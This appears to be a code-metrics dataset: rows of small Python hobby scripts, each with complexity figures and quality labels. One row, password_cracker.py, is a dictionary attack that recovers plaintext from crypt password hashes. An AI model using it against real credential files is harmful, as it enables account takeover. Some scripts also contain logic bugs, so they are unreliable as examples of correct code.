",2577,64,64,14,0,0,0,1.0,20,27,4,56.0,37,,83,200.7497745282712,444.67681638330095,3.027027027027027,bajo,No,False,False,Medium,id230
Polyline.py,"# Polyline drawing in codeskulptor

import simplegui

polyline = []


def click(pos):
    global polyline
    polyline.append(pos)


def clear():
    global polyline
    polyline = []


def draw(canvas):
    if len(polyline) == 1:
        canvas.draw_point(polyline[0], ""White"")
    for i in range(1, len(polyline)):
        canvas.draw_line(polyline[i - 1], polyline[i], 2, ""White"")


frame = simplegui.create_frame(""Echo click"", 300, 200)
frame.set_mouseclick_handler(click)
frame.set_draw_handler(draw)
frame.add_button(""Clear"", clear)

frame.start()
",554,18,18,11,1,1,0,3.0,5,2,2,4.0,3,,6,6.754887502163469,13.931568569324174,1.3333333333333333,medio,No,False,False,Low,id231
check_file.py,"# Script Name		: check_file.py

# Author		: Craig Richards
# Created		: 20 May 2013
# Last Modified		:
# Version		: 1.0

# Modifications	: with statement added to ensure correct file closure

# Description	: Check a file exists and that we can read the file
from __future__ import print_function

import os  # Import the Modules
import sys  # Import the Modules


# Prints usage if not appropriate length of arguments are provided


def usage():
    print(""[-] Usage: python check_file.py [filename1] [filename2] ... [filenameN]"")


# Readfile Functions which open the file that is passed to the script
def readfile(filename):
    with open(filename, ""r"") as f:  # Ensure file is correctly closed under
        read_file = f.read()  # all circumstances
    print(read_file)
    print()
    print(""#"" * 80)
    print()


def main():
    # Check the arguments passed to the script
    if len(sys.argv) >= 2:
        file_names = sys.argv[1:]
        filteredfilenames_1 = list(
            file_names
        )  # To counter changing in the same list which you are iterating
        filteredfilenames_2 = list(file_names)
        # Iterate for each filename passed in command line argument
        for filename in filteredfilenames_1:
            if not os.path.isfile(filename):  # Check the File exists
                print(""[-] "" + filename + "" does not exist."")
                filteredfilenames_2.remove(
                    filename
                )  # remove non existing files from fileNames list
                continue

            # Check you can read the file
            if not os.access(filename, os.R_OK):
                print(""[-] "" + filename + "" access denied"")
                # remove non readable fileNames
                filteredfilenames_2.remove(filename)
                continue

        # Read the content of each file that both exists and is readable
        for filename in filteredfilenames_2:
            # Display Message and read the file contents
            print(""[+] Reading from : "" + filename)
            readfile(filename)

    else:
        usage()  # Print usage if not all parameters passed/Checked


if __name__ == ""__main__"":
    main()
",2186,34,37,17,23,15,0,3.0,8,10,5,18.0,15,,28,70.2129994085646,121.01398665684616,3.0,alto,No,False,False,Low,id232
password_cracker.py,"from __future__ import print_function

from sys import platform as _platform

# Script Name	: password_cracker.py
# Author		: Craig Richards
# Created		: 20 May 2013
# Last Modified	:
# Version		: 1.0
# Modifications	:
# Description	: Old school password cracker using python

# Check the current operating system to import the correct version of crypt
if _platform in [""linux"", ""linux2"", ""darwin""]:  # darwin is _platform name for Mac OS X
    import crypt  # Import the module
elif _platform == ""win32"":
    # Windows
    try:
        import fcrypt  # Try importing the fcrypt module
    except ImportError:
        print(""Please install fcrypt if you are on Windows"")


def testPass(cryptPass):  # Start the function
    salt = cryptPass[0:2]
    dictFile = open(""dictionary.txt"", ""r"")  # Open the dictionary file
    for word in dictFile.readlines():  # Scan through the file
        word = word.strip(""\n"")
        cryptWord = crypt.crypt(word, salt)  # Check for password in the file
        if cryptWord == cryptPass:
            print(""[+] Found Password: "" + word + ""\n"")
            return
    print(""[-] Password Not Found.\n"")
    return


def main():
    passFile = open(""passwords.txt"")  # Open the password file
    for line in passFile.readlines():  # Read through the file
        if "":"" in line:
            user = line.split("":"")[0]
            cryptPass = line.split("":"")[1].strip("" "")  # Prepare the user name etc
            print(""[*] Cracking Password For: "" + user)
            testPass(cryptPass)  # Call it to crack the users password


if __name__ == ""__main__"":
    main()
",1602,31,30,9,20,9,0,2.0,6,8,3,16.0,15,,24,63.35824643629125,100.07820003461548,1.6,alto,No,False,False,Low,id233
folder_size.py,"# Script Name   : folder_size.py
# Author        : Craig Richards
# Created       : 19th July 2012
# Last Modified	: 22 February 2016
# Version       : 1.0.1

# Modifications : Modified the Printing method and added a few comments

# Description   : This will scan the current directory and all subdirectories and display the size.

import os
import sys  # Load the library module and the sys module for the argument vector'''

try:
    directory = sys.argv[
        1
    ]  # Set the variable directory to be the argument supplied by user.
except IndexError:
    sys.exit(""Must provide an argument."")

dir_size = 0  # Set the size to 0
fsizedicr = {
    ""Bytes"": 1,
    ""Kilobytes"": float(1) / 1024,
    ""Megabytes"": float(1) / (1024 * 1024),
    ""Gigabytes"": float(1) / (1024 * 1024 * 1024),
}
for (path, dirs, files) in os.walk(
    directory
):  # Walk through all the directories. For each iteration, os.walk returns the folders, subfolders and files in the dir.
    for file in files:  # Get all the files
        filename = os.path.join(path, file)
        dir_size += os.path.getsize(
            filename
        )  # Add the size of each file in the root dir to get the total size.

fsizeList = [
    str(round(fsizedicr[key] * dir_size, 2)) + "" "" + key for key in fsizedicr
]  # List of units

if dir_size == 0:
    print(""File Empty"")  # Sanity check to eliminate corner-case of empty file.
else:
    for units in sorted(fsizeList)[
        ::-1
    ]:  # Reverse sort list of units so smallest magnitude units print first.
        print(""Folder Size: "" + units)
",1576,19,33,7,16,7,0,0.0,0,13,5,25.0,18,,38,86.66829050039843,171.8953543301665,3.4722222222222223,alto,No,False,False,Low-Medium,id234
audiobook_gen.py,"import PyPDF2
import pyttsx3

book = open(input(""Enter the book name: ""), ""rb"")
pg_no = int(
    input(
        ""Enter the page number from which you want the system to start reading text: ""
    )
)

pdf_Reader = PyPDF2.PdfFileReader(book)
pages = pdf_Reader.numPages

speaker = pyttsx3.init()

for num in range((pg_no - 1), pages):
    page = pdf_Reader.getPage(num)
    text = page.extractText()
    speaker.say(text)
    speaker.runAndWait()
",465,12,16,4,0,0,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,True,False,Low,id235
"To print series 1,12,123,1234......py","# master
def num(a):

    # initialising starting number

    num = 1

    # outer loop to handle number of rows

    for i in range(0, a):

        # re assigning num

        num = 1

        # inner loop to handle number of columns

        # values changing acc. to outer loop

        for k in range(0, i + 1):

            # printing number

            print(num, end="" "")

            # incrementing number at each column

            num = num + 1

        # ending line after each row

        print(""\r"")


# Driver code

a = 5

num(a)
# =======
# 1-12-123-1234 Pattern up to n lines

n = int(input(""Enter number of rows: ""))

for i in range(1, n + 1):
    for j in range(1, i + 1):
        print(j, end="""")
    print()

# master
",741,15,15,22,13,13,0,1.0,3,4,1,8.0,6,,12,15.509775004326936,33.68825906469125,0.6666666666666666,alto,No,True,False,Low,id236
vowel remover function.py,"def vowel_remover(text):
    string = """"
    for l in text:
        if l.lower() not in ""aeiou"":
            string += l
    return string
print(vowel_remover(""hello world!""))
",176,7,7,0,0,0,0,1.0,3,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,No,False,False,Low,id237
recursiveStrings.py,""""""" author: Ataba29 
code has a matrix each list inside of the matrix has two strings
the code determines if the two strings are similar or different 
from each other recursively
""""""


def CheckTwoStrings(str1, str2):
    # function takes two strings and check if they are similar
    # returns True if they are identical and False if they are different

    if(len(str1) != len(str2)):
        return False
    if(len(str1) == 1 and len(str2) == 1):
        return str1[0] == str2[0]

    return (str1[0] == str2[0]) and CheckTwoStrings(str1[1:], str2[1:])


def main():
    matrix = [[""hello"", ""wow""], [""ABSD"", ""ABCD""],
              [""List"", ""List""], [""abcspq"", ""zbcspq""],
              [""1263"", ""1236""], [""lamar"", ""lamars""],
              [""amczs"", ""amczs""], [""yeet"", ""sheesh""], ]

    for i in matrix:
        if CheckTwoStrings(i[0], i[1]):
            print(f""{i[0]},{i[1]} are similar"")
        else:
            print(f""{i[0]},{i[1]} are different"")


main()
",968,16,17,9,2,2,5,2.0,8,7,3,14.0,13,,21,52.86060383799767,84.0,1.6153846153846154,alto,No,False,False,Low,id238
Organise.py,"from __future__ import print_function

import os
import shutil
import sys

EXT_VIDEO_LIST = [""FLV"", ""WMV"", ""MOV"", ""MP4"", ""MPEG"", ""3GP"", ""MKV"", ""AVI""]
EXT_IMAGE_LIST = [""JPG"", ""JPEG"", ""GIF"", ""PNG"", ""SVG""]
EXT_DOCUMENT_LIST = [
    ""DOC"",
    ""DOCX"",
    ""PPT"",
    ""PPTX"",
    ""PAGES"",
    ""PDF"",
    ""ODT"",
    ""ODP"",
    ""XLSX"",
    ""XLS"",
    ""ODS"",
    ""TXT"",
    ""IN"",
    ""OUT"",
    ""MD"",
]
EXT_MUSIC_LIST = [""MP3"", ""WAV"", ""WMA"", ""MKA"", ""AAC"", ""MID"", ""RA"", ""RAM"", ""RM"", ""OGG""]
EXT_CODE_LIST = [""CPP"", ""RB"", ""PY"", ""HTML"", ""CSS"", ""JS""]
EXT_EXECUTABLE_LIST = [""LNK"", ""DEB"", ""EXE"", ""SH"", ""BUNDLE""]
EXT_COMPRESSED_LIST = [
    ""RAR"",
    ""JAR"",
    ""ZIP"",
    ""TAR"",
    ""MAR"",
    ""ISO"",
    ""LZ"",
    ""7ZIP"",
    ""TGZ"",
    ""GZ"",
    ""BZ2"",
]

# Taking the location of the Folder to Arrange
try:
    destLocation = str(sys.argv[1])
except IndexError:
    destLocation = str(input(""Enter the Path of directory: ""))


# When we make a folder that already exist then WindowsError happen
# Changing directory may give WindowsError
def ChangeDirectory(dir):
    try:
        os.chdir(dir)
    except WindowsError:
        print(""Error! Cannot change the Directory"")
        print(""Enter a valid directory!"")
        ChangeDirectory(str(input(""Enter the Path of directory: "")))


ChangeDirectory(destLocation)


def Organize(dirs, name):
    try:
        os.mkdir(name)
        print(""{} Folder Created"".format(name))
    except WindowsError:
        print(""{} Folder Exist"".format(name))

    src = ""{}\\{}"".format(destLocation, dirs)
    dest = ""{}\{}"".format(destLocation, name)

    os.chdir(dest)
    shutil.move(src, ""{}\\{}"".format(dest, dirs))

    print(os.getcwd())
    os.chdir(destLocation)


TYPES_LIST = [
    ""Video"",
    ""Images"",
    ""Documents"",
    ""Music"",
    ""Codes"",
    ""Executables"",
    ""Compressed"",
]
for dirs in os.listdir(os.getcwd()):
    if 1:
        for name, extensions_list in zip(
            TYPES_LIST,
            [
                EXT_VIDEO_LIST,
                EXT_IMAGE_LIST,
                EXT_DOCUMENT_LIST,
                EXT_MUSIC_LIST,
                EXT_CODE_LIST,
                EXT_EXECUTABLE_LIST,
                EXT_COMPRESSED_LIST,
            ],
        ):
            if dirs.split(""."")[-1].upper() in extensions_list:
                Organize(dirs, name)
    else:
        if dirs not in TYPES_LIST:
            Organize(dirs, ""Folders"")

print(""Done Arranging Files and Folder in your specified directory"")
",2577,45,92,15,3,3,0,2.0,4,3,3,5.0,5,,8,16.36452797660028,24.0,1.5,medio,No,True,False,Low,id239
googlemaps.py,"import requests
import json
import geocoder

g = geocoder.ip(""me"")

lat = g.latlng[0]

longi = g.latlng[1]
query = input(""Enter the query"")

key = ""your_api_key""
url = (
    ""https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=""
    + str(lat)
    + "",""
    + str(longi)
    + ""radius=1000""
)

r = requests.get(url + ""query="" + query + ""&key="" + key)

x = r.json()
y = x[""results""]
print(y)
",409,13,19,6,0,0,0,,0,8,1,16.0,16,,24,64.0,98.09910819000817,0.5,medio,No,True,False,Low,id240
Update a binary file.py,"# Updating records in a binary file

import pickle


def update():
    with open(""class.dat"", ""rb+"") as F:
        S = pickle.load(F)
        found = False
        rno = int(input(""enter the roll number you want to update""))

        for i in S:
            if rno == i[0]:
                print(f""the currrent name is {i[1]}"")
                i[1] = input(""enter the new name"")
                found = True
                break

        if found:
            print(""Record not found"")

        else:
            F.seek(0)
            pickle.dump(S, F)


update()

with open(""class.dat"", ""rb"") as F:
    print(pickle.load(F))
",657,20,20,9,1,1,0,1.0,4,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,True,False,Low,id241
bodymass.py,"kilo = float (input(""kilonuzu giriniz(Ã¶rnek: 84.9): ""))
boy = float (input(""Boyunuzu m cinsinden giriniz: ""))

vki = (kilo / (boy**2))

if vki < 18.5:
    print(f""vucut kitle indeksiniz:  {vki} zayÄ±fsÄ±nÄ±z."")
elif vki < 25:
    print (f""vucut kitle indeksiniz: {vki} normalsiniz."")
elif vki < 30:
    print (f""vucut kitle indeksiniz: {vki} fazla kilolusunuz."")
elif vki < 35:
    print (f""vucut kitle indeksiniz: {vki} 1. derece obezsiniz"")
elif vki < 40:
    print (f""vucut kitle indeksiniz: {vki} 2.derece obezsiniz."")
elif vki >40:
    print (f""vucut kitle indeksiniz: {vki} 3.derece obezsiniz."")
else:
    print(""YanlÄ±Å deÄer girdiniz."")
",648,17,17,2,0,0,0,0.0,0,8,4,16.0,10,,24,41.21928094887362,91.37651812938248,3.2,medio,No,True,False,Low,id242
SimpleCalculator.py,"# Simple Calculator
def add(a, b):
    return a + b


def subtract(a, b):
    return a - b


def multiply(a, b):
    return a * b


def divide(a, b):
    try:
        return a / b
    except ZeroDivisionError:
        return ""Zero Division Error""


def power(a, b):
    return a ** b


def main():
    print(""Select Operation"")
    print(""1.Add"")
    print(""2.Subtract"")
    print(""3.Multiply"")
    print(""4.Divide"")
    print(""5.Power"")

    choice = input(""Enter Choice(+,-,*,/,^): "")
    num1 = int(input(""Enter first number: ""))
    num2 = int(input(""Enter Second number:""))

    if choice == ""+"":
        print(num1, ""+"", num2, ""="", add(num1, num2))

    elif choice == ""-"":
        print(num1, ""-"", num2, ""="", subtract(num1, num2))

    elif choice == ""*"":
        print(num1, ""*"", num2, ""="", multiply(num1, num2))

    elif choice == ""/"":
        print(num1, ""/"", num2, ""="", divide(num1, num2))
    elif choice == ""**"":
        print(num1, ""^"", num2, ""="", power(num1, num2))
    else:
        print(""Invalid input"")
        main()


if __name__ == ""__main__"":
    main()
",1078,38,38,17,1,1,0,,12,11,6,22.0,18,,33,90.56842503028857,151.30376252379818,3.6666666666666665,medio,No,True,False,Low-Medium,id243
Python Program to Find LCM.py,"# Python Program to find the L.C.M. of two input number

def compute_lcm(x, y):

   # choose the greater number
   if x > y:
       greater = x
   else:
       greater = y

   while(True):
       if((greater % x == 0) and (greater % y == 0)):
           lcm = greater
           break
       greater += 1

   return lcm

num1 = 54
num2 = 24

print(""The L.C.M. is"", compute_lcm(num1, num2))
",390,14,14,6,2,2,0,1.0,5,7,5,14.0,9,,21,40.13896548741762,79.95445336320968,3.888888888888889,alto,No,False,False,Low,id244
whatsapp-schedule.py,"""""""
Author- Richmond Nyamekye 

download https://github.com/mozilla/geckodriver/releases

install requirements: python -m pip install selenium

""""""
import pywhatkit


def send_msg(phone: str, msg: str, hour: int, minute: int) -> None:
    pywhatkit.sendwhatmsg(phone, msg, hour, minute)


def send_whatmsg_to_group(group: str, msg: str, hour: int, minute: int) -> None:
    pywhatkit.send_whatmsg_to_group(group, msg, hour, minute)


def main():
    msg_type = int(input(""Enter 1 to send a message to a uSER and 2 to a GROUP: ""))
    if msg_type == 1:
        phone = input(""Enter phone number: "")
        if phone[0] == ""0"":
            phone = phone[1::]
        while True:
            if len(phone) < 9:
                raise ValueError(""Invalid phone number: "")
            else:
                break
        phone = f""+233{phone}""
    elif msg_type == 2:
        group = input(""Enter group to send message: "")
    msg = str(input(""Enter message: ""))
    hour = int(input(""Enter the time in hour: ""))
    minute = int(input(""Enter the time in minute: ""))

    if msg_type == 1:
        send_msg(phone, msg, hour, minute)
    elif msg_type == 2:
        send_whatmsg_to_group(group, msg, hour, minute)


if __name__ == ""__main__"":
    main()
",1292,30,28,12,0,0,5,3.0,10,7,2,14.0,9,,21,30.529325012980813,72.64806399138325,1.5555555555555556,medio,No,True,False,Low,id245
Python Program to Print the Fibonacci sequence.py,"# Program to display the Fibonacci sequence up to n-th term

nterms = int(input(""How many terms? ""))

# first two terms
n1, n2 = 0, 1
count = 0

# check if the number of terms is valid
if nterms <= 0:
   print(""Please enter a positive integer"")
elif nterms == 1:
   print(""Fibonacci sequence upto"",nterms,"":"")
   print(n1)
else:
   print(""Fibonacci sequence:"")
   while count < nterms:
       print(n1)
       nth = n1 + n2
       # update values
       n1 = n2
       n2 = nth
       count += 1
",496,16,16,3,4,4,0,0.0,0,5,4,10.0,6,,15,23.509775004326936,49.82892142331044,3.333333333333333,alto,No,True,False,Low,id246
PONG_GAME.py,"# Pong Game in Codeskulptor

import random

import simplegui

WIDTH = 600
HEIGHT = 400
BALL_RADIUS = 20
PAD_WIDTH = 8
PAD_HEIGHT = 80
HALF_PAD_WIDTH = PAD_WIDTH / 2
HALF_PAD_HEIGHT = PAD_HEIGHT / 2
LEFT = False
RIGHT = True
score1 = 0
score2 = 0
paddle1_pos = 0
paddle2_pos = 0
paddle1_vel = 0
paddle2_vel = 0


def spawn_ball(direction):
    global ball_pos, ball_vel  # these are vectors stored as lists
    ball_pos = [WIDTH / 2, HEIGHT / 2]
    if direction == RIGHT:
        ball_vel = [random.randrange(120, 240) / 60, random.randrange(60, 180) / 60]
    elif direction == LEFT:
        ball_vel = [-random.randrange(120, 240) / 60, random.randrange(60, 180) / 60]


def reset():
    global ball_pos, score1, score2
    ball_pos = [WIDTH / 2, HEIGHT / 2]
    score1 = 0
    score2 = 0


def new_game():
    global paddle1_pos, paddle2_pos, paddle1_vel, paddle2_vel
    global score1, score2
    reset()
    spawn_ball(RIGHT)


def draw(canvas):
    global paddle1_pos, paddle2_pos, ball_pos, ball_vel, paddle1_vel, paddle2_vel, BALL_RADIUS
    global score1, score2

    canvas.draw_line([WIDTH / 2, 0], [WIDTH / 2, HEIGHT], 1, ""White"")
    canvas.draw_line([PAD_WIDTH, 0], [PAD_WIDTH, HEIGHT], 1, ""White"")
    canvas.draw_line([WIDTH - PAD_WIDTH, 0], [WIDTH - PAD_WIDTH, HEIGHT], 1, ""White"")

    ball_pos[0] += ball_vel[0]
    ball_pos[1] += ball_vel[1]

    if (
        ball_pos[0] <= BALL_RADIUS + PAD_WIDTH
        or ball_pos[0] >= WIDTH - BALL_RADIUS - PAD_WIDTH
    ):
        ball_vel[0] = -ball_vel[0]
    elif (
        ball_pos[1] <= BALL_RADIUS + PAD_WIDTH
        or ball_pos[1] >= HEIGHT - BALL_RADIUS - PAD_WIDTH
    ):
        ball_vel[1] = -ball_vel[1]

    canvas.draw_circle(ball_pos, BALL_RADIUS, 1, ""White"", ""White"")

    paddle1_pos += paddle1_vel
    paddle2_pos += paddle2_vel

    if paddle1_pos <= -HEIGHT / 2 + PAD_HEIGHT / 2:
        paddle1_pos = -HEIGHT / 2 + PAD_HEIGHT / 2
    elif paddle1_pos >= HEIGHT / 2 - PAD_HEIGHT / 2:
        paddle1_pos = HEIGHT / 2 - PAD_HEIGHT / 2

    if paddle2_pos <= -HEIGHT / 2 + PAD_HEIGHT / 2:
        paddle2_pos = -HEIGHT / 2 + PAD_HEIGHT / 2
    elif paddle2_pos >= HEIGHT / 2 - PAD_HEIGHT / 2:
        paddle2_pos = HEIGHT / 2 - PAD_HEIGHT / 2

    canvas.draw_line(
        [PAD_WIDTH / 2, paddle1_pos + HEIGHT / 2 - PAD_HEIGHT / 2],
        [PAD_WIDTH / 2, paddle1_pos + PAD_HEIGHT / 2 + HEIGHT / 2],
        10,
        ""White"",
    )
    canvas.draw_line(
        [WIDTH - PAD_WIDTH / 2, paddle2_pos + HEIGHT / 2 - PAD_HEIGHT / 2],
        [WIDTH - PAD_WIDTH / 2, PAD_HEIGHT / 2 + paddle2_pos + HEIGHT / 2],
        10,
        ""White"",
    )

    if (
        ball_pos[1] <= (paddle1_pos + HEIGHT / 2 - PAD_HEIGHT / 2)
        or ball_pos[1] >= (paddle1_pos + PAD_HEIGHT / 2 + HEIGHT / 2)
    ) and ball_pos[0] == (PAD_WIDTH + BALL_RADIUS):
        score2 += 1
    else:
        pass

    if (
        ball_pos[1] <= (paddle2_pos + HEIGHT / 2 - PAD_HEIGHT / 2)
        or ball_pos[1] >= (paddle2_pos + PAD_HEIGHT / 2 + HEIGHT / 2)
    ) and ball_pos[0] == (WIDTH - PAD_WIDTH - BALL_RADIUS):
        score1 += 1
    else:
        pass

    canvas.draw_text(str(score1), (250, 30), 40, ""White"")
    canvas.draw_text(str(score2), (330, 30), 40, ""White"")


def keydown(key):
    global paddle1_vel, paddle2_vel
    if key == simplegui.KEY_MAP[""down""]:
        paddle1_vel = 2
    elif key == simplegui.KEY_MAP[""up""]:
        paddle1_vel = -2

    if key == simplegui.KEY_MAP[""w""]:
        paddle2_vel = -2
    elif key == simplegui.KEY_MAP[""s""]:
        paddle2_vel = 2


def keyup(key):
    global paddle1_vel, paddle2_vel
    if key == simplegui.KEY_MAP[""down""] or key == simplegui.KEY_MAP[""up""]:
        paddle1_vel = 0
    if key == simplegui.KEY_MAP[""w""] or key == simplegui.KEY_MAP[""s""]:
        paddle2_vel = 0


frame = simplegui.create_frame(""Pong"", WIDTH, HEIGHT)
frame.set_draw_handler(draw)
frame.set_keydown_handler(keydown)
frame.set_keyup_handler(keyup)
frame.add_button(""Restart"", reset)

new_game()
print()
frame.start()
",4018,93,115,30,2,1,0,6.0,30,132,9,255.0,137,,387,1000.959720378573,2782.462104286567,8.375912408759124,bajo,No,False,True,,id247
RandomNumberGame.py,"""""""
  hey everyone it is a basic game code using random . in this game computer will randomly chose an number from 1 to 100 and players will have 
  to guess that which number it is and game will tell him on every guss whether his/her guess is smaller or bigger than the chosen number. it is 
  a multi player game so it can be played with many players there is no such limitations of user till the size of list. if any one wants to modify 
  this game he/she is most welcomed.
    Thank you
""""""

import os
import random

players = []
score = []

print(
    ""\n\tRandom Number Game\n\nHello Everyone ! it is just a game of chance in which you have to guess a number""
    "" from 0 to 100 and computer will tell whether your guess is smaller or bigger than the acctual number chossen by the computer . ""
    ""the person with less attempts in guessing the number will be winner .""
)
x = input()
os.system(""cls"")

n = int(input(""Enter number of players : ""))
print()

for i in range(0, n):
    name = input(""Enter name of player : "")
    players.append(name)

os.system(""cls"")

for i in range(0, n):
    orignum = random.randint(1, 100)
    print(players[i], ""your turn :"", end=""\n\n"")
    count = 0
    while True:
        ch = int(input(""Please enter your guess : ""))
        if ch > orignum:
            print(""no! number is smaller..."")
            count += 1
        elif ch == orignum:
            print(""\n\n\tcongrats you won"")
            break
        else:
            print(""nope ! number is large dude..."")
            count += 1
    print(""    you have taken"", count + 1, ""attempts"")
    x = input()
    score.append(count + 1)
    os.system(""cls"")
print(""players :\n"")
for i in range(0, n):
    print(players[i], ""-"", score[i])

print(""\n\nwinner is :\n"")
for i in range(0, n):
    if score[i] == min(score):
        print(players[i])
x = input()
",1858,41,44,8,0,0,7,0.0,0,7,3,14.0,6,,21,20.264662506490406,66.56842503028857,3.5,medio,No,True,True,Low,id248
ball.py,"# ./PongPong/pong/ball.py

import pyglet
import random
from typing import Tuple


class BallObject(pyglet.shapes.Circle):
    def __init__(self, *args, **kwargs):
        super(BallObject, self).__init__(*args, **kwargs)
        self.color = (255, 180, 0)
        self.velocity_x, self.velocity_y = 0.0, 0.0

    def update(self, win_size: Tuple, border: Tuple, other_object, dt) -> None:
        speed = [
            2.37,
            2.49,
            2.54,
            2.62,
            2.71,
            2.85,
            2.96,
            3.08,
            3.17,
            3.25,
        ]  # more choices more randomness
        rn = random.choice(speed)
        newx = self.x + self.velocity_x
        newy = self.y + self.velocity_y

        if newx < border + self.radius or newx > win_size[0] - border - self.radius:
            self.velocity_x = -(self.velocity_x / abs(self.velocity_x)) * rn
        elif newy > win_size[1] - border - self.radius:
            self.velocity_y = -(self.velocity_y / abs(self.velocity_y)) * rn
        elif (newy - self.radius < other_object.height) and (
            other_object.x <= newx <= other_object.rightx
        ):
            self.velocity_y = -(self.velocity_y / abs(self.velocity_y)) * rn
        else:
            self.x = newx
            self.y = newy
",1313,22,35,5,2,1,0,,12,25,10,,32,,71,193.21928094887363,382.854537017292,7.1875,medio,Yes,False,True,Medium-High,id249
Gregorian_Calendar.py,"# An extra day is added to the calendar almost every four years as February 29, and the day is called a leap day. It corrects the calendar for the fact that our planet takes approximately 365.25 days to orbit the sun. A leap year contains a leap day.

# In the Gregorian calendar, three conditions are used to identify leap years:

# The year can be evenly divided by 4, is a leap year, unless:
# The year can be evenly divided by 100, it is NOT a leap year, unless:
# The year is also evenly divisible by 400. Then it is a leap year.
# This means that in the Gregorian calendar, the years 2000 and 2400 are leap years, while 1800, 1900, 2100, 2200, 2300 and 2500 are NOT leap years.


def is_leap(year):
    leap = False
    if year % 4 == 0:
        leap = True
        if year % 100 == 0:
            leap = False
            if year % 400 == 0:
                leap = True
    return leap


year = int(input(""Enter the year here: ""))
print(is_leap(year))

# If the given year is a leap year it outputs True else False
",1022,11,11,7,7,7,0,1.0,4,6,2,12.0,8,,18,26.0,59.794705707972525,1.5,alto,No,True,False,Low,id250
snake.py,"# SNAKES GAME
# Use ARROW KEYS to play, SPACE BAR for pausing/resuming and Esc Key for exiting
# Original Author : Sanchit Gangwar
# Modified by : Rayan Dutta
# Minor changes made to keep the game working.

try:
    import curses
    from time import sleep
    from curses import KEY_RIGHT, KEY_LEFT, KEY_UP, KEY_DOWN
    from random import randint

    print(
        ""Use the arrow keys to move, press the space bar to pause, and press ESC to quit""
    )
    sleep(1)
    key = KEY_RIGHT  # Initializing values
    curses.initscr()
    win = curses.newwin(20, 60, 0, 0)
    win.keypad(1)
    curses.noecho()
    curses.curs_set(0)
    win.border(0)
    win.nodelay(1)
    x, y = win.getmaxyx()
    key = KEY_DOWN  # Initializing values
    score = 0
    s = open("".snake_highscore.txt"", ""r"")
    hscore = s.read()
    s.close()
    snake = [[4, 10], [4, 9], [4, 8]]  # Initial snake co-ordinates
    food = [10, 20]  # First food co-ordinates

    win.addch(food[0], food[1], ""*"")  # Prints or shows the food

    while key != 27:  # While Esc key is not pressed
        win.border(0)
        win.addstr(0, 2, ""Score : "" + str(score) + "" "")  # Printing 'Score' and
        win.addstr(0, 27, "" SNAKE "")  # 'SNAKE' strings
        win.addstr(0, 37, ""Highscore: "" + str(hscore) + "" "")

        win.timeout(
            int(150 - (len(snake) / 5 + len(snake) / 10) % 120)
        )  # Increases the speed of Snake as its length increases

        prevKey = key  # Previous key pressed
        event = win.getch()
        key = key if event == -1 else event

        if key == ord("" ""):  # If SPACE BAR is pressed, wait for another
            key = -1  # one (Pause/Resume)
            win.addstr(0, 40, ""PAUSED"")
            while key != ord("" ""):
                key = win.getch()
            key = prevKey
            continue

        if key not in [
            KEY_LEFT,
            KEY_RIGHT,
            KEY_UP,
            KEY_DOWN,
            27,
        ]:  # If an invalid key is pressed
            key = prevKey

        # Calculates the new coordinates of the head of the snake. NOTE: len(snake) increases.
        # This is taken care of later at [1].
        snake.insert(
            0,
            [
                snake[0][0] + (key == KEY_DOWN and 1) + (key == KEY_UP and -1),
                snake[0][1] + (key == KEY_LEFT and -1) + (key == KEY_RIGHT and 1),
            ],
        )

        # If snake crosses the boundaries, make it enter from the other side
        if snake[0][0] == 0:
            snake[0][0] = 18
        if snake[0][1] == 0:
            snake[0][1] = 58
        if snake[0][0] == 19:
            snake[0][0] = 1
        if snake[0][1] == 59:
            snake[0][1] = 1

        # Exit if snake crosses the boundaries (Uncomment to enable)
        # if snake[0][0] == 0 or snake[0][0] == 19 or snake[0][1] == 0 or snake[0][1] == 59: break

        # If snake runs over itself
        if snake[0] in snake[1:]:
            break

        if snake[0] == food:  # When snake eats the food
            food = []
            score += 1
            while food == []:
                food = [
                    randint(1, 18),
                    randint(1, 58),
                ]  # Calculating next food's coordinates
                if food in snake:
                    food = []
            win.addch(food[0], food[1], ""*"")
        else:
            last = snake.pop()  # [1] If it does not eat the food, length decreases
            win.addch(last[0], last[1], "" "")
        win.addch(snake[0][0], snake[0][1], ""#"")


except KeyboardInterrupt or EOFError:
    curses.endwin()
    print(""Score - "" + str(score))
    if score > int(hscore):
        s = open("".snake_highscore.txt"", ""w"")
        s.write(str(score))
        s.close()

curses.endwin()
if score > int(hscore):
    s = open("".snake_highscore.txt"", ""w"")
    s.write(str(score))
    s.close()
print(""Score - "" + str(score))
",3929,78,97,16,27,11,0,0.0,0,44,12,84.0,64,,128,427.0195500086539,799.734721720779,7.875,medio,No,False,False,High,id251
snake_case_renamer_depth_one.py,"import os
import argparse
from typing import Union

def generate_unique_name(directory: str, name: str) -> str:
    """"""
    Generate a unique name for a file or folder in the specified directory.

    Parameters:
    ----------
    directory : str
        The path to the directory.
    name : str
        The name of the file or folder.

    Returns:
    -------
    str
        The unique name with an index.
    """"""
    base_name, extension = os.path.splitext(name)
    index = 1
    while os.path.exists(os.path.join(directory, f""{base_name}_{index}{extension}"")):
        index += 1
    return f""{base_name}_{index}{extension}""

def rename_files_and_folders(directory: str) -> None:
    """"""
    Rename files and folders in the specified directory to lowercase with underscores.

    Parameters:
    ----------
    directory : str
        The path to the directory containing the files and folders to be renamed.

    Returns:
    -------
    None
    """"""
    if not os.path.isdir(directory):
        raise ValueError(""Invalid directory path."")

    for name in os.listdir(directory):
        old_path = os.path.join(directory, name)
        new_name = name.lower().replace("" "", ""_"")
        new_path = os.path.join(directory, new_name)

        # Check if the new filename is different from the old filename
        if new_name != name:
            # Check if the new filename already exists in the directory
            if os.path.exists(new_path):
                # If the new filename exists, generate a unique name with an index
                new_path = generate_unique_name(directory, new_name)

            os.rename(old_path, new_path)

def main() -> None:
    """"""
    Main function to handle command-line arguments and call the renaming function.

    Usage:
    ------
    python script_name.py <directory_path>

    Example:
    --------
    python rename_files_script.py /path/to/directory

    """"""
    # Create a parser for command-line arguments
    parser = argparse.ArgumentParser(description=""Rename files and folders to lowercase with underscores."")
    parser.add_argument(""directory"", type=str, help=""Path to the directory containing the files and folders to be renamed."")
    args = parser.parse_args()

    # Call the rename_files_and_folders function with the provided directory path
    rename_files_and_folders(args.directory)

if __name__ == ""__main__"":
    main()
",2397,30,27,15,5,5,32,3.0,8,4,4,7.0,7,,11,27.651484454403228,38.05374780501028,2.0,medio,No,False,False,Low,id252
